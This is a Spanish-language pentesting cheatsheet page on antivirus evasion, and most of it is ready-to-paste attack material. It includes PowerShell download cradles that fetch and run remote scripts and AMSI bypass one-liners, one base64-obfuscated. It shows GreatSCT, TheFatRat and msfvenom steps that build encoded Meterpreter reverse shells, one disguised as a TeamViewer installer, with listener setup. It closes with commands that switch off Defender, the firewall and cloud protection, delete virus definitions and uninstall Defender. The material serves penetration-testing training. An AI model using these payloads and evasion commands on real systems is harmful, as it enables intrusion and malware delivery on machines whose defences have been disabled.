
# Evasión de Antivirus

## <mark style="color:purple;">Evasión de Antivirus en Endpoints</mark>

### Bypass de ejecución de scripts en tiempo real

El bypass de ejecución de scripts en tiempo real se refiere a técnicas utilizadas por los atacantes para evitar que los sistemas de seguridad detecten y bloqueen la ejecución de scripts maliciosos en tiempo real.

#### Descarga de un ejecutable detectado como malicioso en Powershell

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://172.16.123.137:8000/PowerView.ps1")
```

<pre class="language-powershell"><code class="lang-powershell"><strong>(New-Object System.NET.WebClient).DownloadFile("http://172.16.123.137:8000/PowerView.ps1","powerview.ps1")
</strong></code></pre>

{% hint style="warning" %}
Esto lo detectan los antivirus, por lo que vamos a evadirlo con otras técnicas
{% endhint %}

## <mark style="color:purple;">AMSI Bypass Methods</mark>

El AMSI (Antimalware Scan Interface) es una interfaz de programación de aplicaciones que permite a los proveedores de software antivirus y antimalware integrar sus soluciones en aplicaciones y servicios de Windows. Sin embargo, los atacantes pueden utilizar técnicas para eludir la detección de AMSI y ejecutar código malicioso sin ser detectados.

{% embed url="<https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/>" %}

### AMSI Bypass

* Copiar y pegar en la terminal:

{% code overflow="wrap" %}

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

{% endcode %}

### Base64 Encoded&#x20;

* Copiar y pegar en la terminal:

{% code overflow="wrap" %}

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

{% endcode %}

### AMSI Fail

{% embed url="<http://amsi.fail/>" %}

* Copiar y pegar el código generado en la máquina objetivo, y ya estaríamos bypass [😎](https://emojipedia.org/es/cara-sonriendo-con-gafas-de-sol/)

## <mark style="color:purple;">GreatSCT</mark>

Herramienta automática para bypass de defensas. Es una herramienta de código abierto diseñada para generar payloads maliciosos para pruebas de penetración y evaluación de seguridad. La herramienta está escrita en Python y permite a los usuarios crear payloads personalizados para diferentes sistemas operativos y arquitecturas.

{% embed url="<https://github.com/GreatSCT/GreatSCT>" %}

* Genera payloads compatibles con MetaSploit para bypassear defensas
* Instalar siguiendo los pasos del repositorio.

```python
list > use 1
List # Nos muestra los payloads que no detecta windows
# regasm y regsvcs son dificiles de detectar por los antivirus
use regasm/meterpreter/rev_tcp.py
set host IP_KALI
set lport 5555
generate
```

* Dar un nombre al payload o dejar por defecto
* Nos da las instrucciones para ejecutarlo:

```
[*] Language: regasm
[*] Payload Module: regasm/meterpreter/rev_tcp
[*] DLL written to: /usr/share/greatsct-output/compiled/payload.dll
[*] Source code written to: /usr/share/greatsct-output/source/payload.cs
[*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
[*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/payload.rc
```

```
cp /usr/share/greatsct-output/compiled/payload.dll /home/kali/Escritorio
```

* Enviar el payload.dll a la maquina windows

{% content-ref url="/pages/nidKxJlqN0jQ1pHco7Rc" %}
[File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md)
{% endcontent-ref %}

{% code title="En Kali Linux" %}

```
msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

{% endcode %}

{% code title="En máquina Windows" %}

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
```

{% endcode %}

* Y ya tenemos abierta la sesión de meterpreter, haciendo el bypass del antivirus

### <mark style="color:purple;">**Payload de Msfvenom con codificación**</mark>

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

<SNIP>
```

#### Codificación Shikata Ga Nai

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

Esto generará una carga útil con el `exe`formato llamado TeamViewerInstall.exe, que está diseñado para funcionar en procesadores de arquitectura x86 para la plataforma Windows, con una carga útil de shell Meterpreter inversa\_tcp oculta, codificada <mark style="color:purple;">una vez</mark> con el esquema Shikata Ga Nai.

Para que sea menos detectado por los antivirus podemos codificarlo varias veces

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
```

Al subir el payload a Virustotal vemos que lo siguen detectando los antivirus incluso con varias capas de cifrado. Alternativamente, Metasploit ofrece una herramienta llamada `msf-virustotal` que podemos usar con una clave API para analizar nuestros payloads (requiere registro gratuito en VirusTotal)

```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
==================================================================================================================

 Antivirus             Detected  Version              Result                              Update
 ---------             --------  -------              ------                              ------
 ALYac                 true      1.1.3.1              Trojan.CryptZ.Gen                   20220505
 APEX                  true      6.288                Malicious                           20220504
 AVG                   true      21.1.5827.0          Win32:SwPatch [Wrm]                 20220505
 Acronis               true      1.2.0.108            suspicious                          20220426
 Ad-Aware              true      3.0.21.193           Trojan.CryptZ.Gen                   20220505
 AhnLab-V3             true      3.21.3.10230         Trojan/Win32.Shell.R1283            20220505
 Alibaba               false     0.3.0.5                                                  20190527
 Antiy-AVL             false     3.0                                                      20220505
 Arcabit               true      1.0.0.889            Trojan.CryptZ.Gen                   20220505
 Avast                 true      21.1.5827.0          Win32:SwPatch [Wrm]                 20220505
 Avira                 true      8.3.3.14             TR/Patched.Gen2                     20220505
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                  Trojan.CryptZ.Gen                   20220505
 BitDefenderTheta      true      7.2.37796.0          Gen:NN.ZexaF.34638.eq1@aC@Q!ici     20220428
 Bkav                  true      1.3.0.9899           W32.FamVT.RorenNHc.Trojan           20220505
 <------ SNIP ------>
```

## <mark style="color:purple;">The Fat Rat</mark>

TheFatRat es una herramienta de código abierto que se utiliza para crear payloads maliciosos para pruebas de penetración y evaluación de seguridad. Es una herramienta de fácil uso y cuenta con una interfaz gráfica de usuario intuitiva que permite a los usuarios crear payloads personalizados para diferentes sistemas operativos y arquitecturas.

{% embed url="<https://github.com/screetsec/TheFatRat>" %}

* Instalar segun las instrucciones del repo

```
sudo fatrat
```

### Ejemplo de Bypass con TheFatRat

#### Crear un backdoor con Fudwin 1.0

{% code title="En TheFatRat" %}

```python
2
Slow But Powerful
# Esperar a que compile
sudo cp /root/Fatrat_Generated/Powerfull.ese /home/kali/Escritorio
# Enviar el .exe a la máquina destino
```

{% endcode %}

{% code title="Abrir MetaSploit" %}

```python
msfconsole > use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
set LPORT 4321 # o el que hayamos indicado en Slow But Powerful
exploit
```

{% endcode %}

* Ejecutar el .exe en la máquina destino
* Ya tendríamos acceso

## <mark style="color:purple;">Deshabilitar Windows Defender por comandos</mark>

Ejecutar los siguientes comandos en una Powershell como administrador:

{% hint style="success" %}
**Tip**: Puedes copiar todo el contenido y pegarlo en la PowerShell para evitar ir uno por uno
{% endhint %}

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Deshabilitar protección basada en la nube
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

{% hint style="info" %}
Para *habilitarlo de nuevo* solo tenemos que introducir los mismos comandos terminado en `$false`
{% endhint %}

### Verificar que esta deshabilitado

Podemos ejecutar el siguiente script en Powershell para hacer una verificación completa del estado de seguridad y los elementos que han sido deshabilitados.

{% hint style="success" %}
**Tip**: Puedes copiar y pegar directamente el siguiente script en Powershell para ejecutarlo directamente
{% endhint %}

```powershell
# Script de verificación mejorado con formato visual (compatible con todas versiones de PS)
Write-Host "`n=== ESTADO DE SEGURIDAD DE WINDOWS ===" -ForegroundColor Cyan

# Verificación de Defender
$defender = Get-MpComputerStatus
Write-Host "`n[DEFENDER]" -ForegroundColor Yellow

if ($defender.RealTimeProtectionEnabled -eq $false) {
    Write-Host "Protección tiempo real: DESACTIVADA" -ForegroundColor Green
} else {
    Write-Host "Protección tiempo real: ACTIVA" -ForegroundColor Red
}

if ($defender.BehaviorMonitorEnabled -eq $false) {
    Write-Host "Monitor comportamiento: DESACTIVADO" -ForegroundColor Green
} else {
    Write-Host "Monitor comportamiento: ACTIVO" -ForegroundColor Red
}

if ($defender.IOAVProtectionEnabled -eq $false) {
    Write-Host "Protección IOAV: DESACTIVADA" -ForegroundColor Green
} else {
    Write-Host "Protección IOAV: ACTIVA" -ForegroundColor Red
}

if ($defender.ScriptScanningEnabled -eq $false) {
    Write-Host "Escaneo scripts: DESACTIVADO" -ForegroundColor Green
} else {
    Write-Host "Escaneo scripts: ACTIVO" -ForegroundColor Red
}

# Estado del Firewall
Write-Host "`n[FIREWALL]" -ForegroundColor Yellow
Get-NetFirewallProfile | ForEach-Object {
    if ($_.Enabled) {
        Write-Host ("Perfil {0,-7}: ACTIVO" -f $_.Name) -ForegroundColor Red
    } else {
        Write-Host ("Perfil {0,-7}: DESACTIVADO" -f $_.Name) -ForegroundColor Green
    }
}

# Servicio Defender
$service = Get-Service WinDefend
Write-Host "`n[SERVICIO DEFENDER]" -ForegroundColor Yellow
if ($service.Status -eq "Stopped") {
    Write-Host "Estado: DETENIDO" -ForegroundColor Green
} else {
    Write-Host "Estado: EN EJECUCIÓN" -ForegroundColor Red
}
Write-Host ("Inicio: " + $service.StartType)

# Tamper Protection
try {
    $tamper = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection").TamperProtection
    Write-Host "`n[TAMPER PROTECTION]" -ForegroundColor Yellow
    if ($tamper -eq 0) {
        Write-Host "Estado: DESACTIVADO" -ForegroundColor Green
    } else {
        Write-Host "Estado: ACTIVO" -ForegroundColor Red
    }
} catch {
    Write-Host "`nTamper Protection: No disponible" -ForegroundColor Gray
}

# Definiciones
try {
    $defs = & "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -GetFiles 2>&1
    Write-Host "`n[DEFINICIONES DE VIRUS]" -ForegroundColor Yellow
    if ($defs -match "Signature Version") {
        Write-Host "Definiciones PRESENTES" -ForegroundColor Red
    } else {
        Write-Host "Definiciones ELIMINADAS" -ForegroundColor Green
    }
} catch {
    Write-Host "Error al verificar definiciones" -ForegroundColor Red
}

Write-Host "`n=== FIN DEL REPORTE ===" -ForegroundColor Cyan
```

Eso nos da un reporte visual de los componentes que aún se están ejecutando:

<figure><img src="/files/6FGsX1Bdhz2kTzxFpOe2" alt=""><figcaption></figcaption></figure>

Observamos que algunas opciones persisten activadas tras desactivar componentes debido a:

1. **Arquitectura en Capas**
   * Solo se desactivan funciones periféricas (ej: monitoreo en tiempo real)
   * El núcleo del antivirus permanece activo por diseño
2. **Tamper Protection** (Protección contra alteraciones)
   * Bloquea cambios no autorizados en la configuración
   * Activado por defecto en Windows 10/11
   * Requiere desactivación manual en:

```bash
Configuración > Seguridad > Configuración de antivirus y protección contra amenazas > Protección contra alteraciones
```

<figure><img src="/files/Oo9vlW0WAeQ1rG9odL3U" alt=""><figcaption></figcaption></figure>

#### **Conclusión**

Una desactivación completa exige:

* Deshabilitar Tamper Protection primero
* Modificar políticas vía registro/GPO
* Reiniciar servicios críticos

{% hint style="danger" %}
*Defender emplea defensas en profundidad que requieren intervenciones específicas para su desactivación total.*
{% endhint %}

## <mark style="color:purple;">Desinstalar Windows Defender por comandos</mark>

{% hint style="warning" %}
Necesitamos privilegios de administrador
{% endhint %}

```powershell
Uninstall-WindowsFeature -Name Windows-Defender
```
